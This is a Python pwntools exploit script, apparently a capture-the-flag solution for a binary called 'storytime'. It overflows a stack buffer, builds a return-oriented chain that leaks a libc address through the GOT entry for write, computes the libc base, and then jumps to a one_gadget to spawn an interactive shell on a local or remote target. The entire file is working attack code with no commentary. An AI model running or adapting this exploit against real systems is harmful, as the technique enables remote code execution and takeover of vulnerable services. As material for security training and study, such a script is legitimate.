#!/usr/bin/env python3

from pwn import *

exe = ELF("./storytime_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #r = gdb.debug([exe.path], "c")
        if args.DEBUG:
            gdb.debug([exe.path], "c")
    else:
        r = remote("addr", 1337)

    return r

r = conn()

def main():

    gotwrite = p64(0x601018)
    climax = p64(0x40060e)
    poprsir15 = p64(0x400701) # pop rsi; pop r15; ret;


    payload = b"A"*56 # padding
    payload += poprsir15
    payload += gotwrite
    payload += p64(0x4242424242424242) # padding r15 value
    payload += p64(0x400601) # mov edi 0x1
    payload += p64(0x4343434343434343) # padding for rbp
    payload += climax

    r.recvuntil(b"story: \n")
    r.sendline(payload)

    leak = u64(r.recv(8))
    libc.address = leak - libc.sym.write

    log.info("libc write: " + hex(leak))
    log.info("libc base: " + hex(libc.address))

    one_gadget = p64(libc.address + 0xf02a4)

    payload = b"A"*56
    payload += p64(0x40048e)
    payload += one_gadget

    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
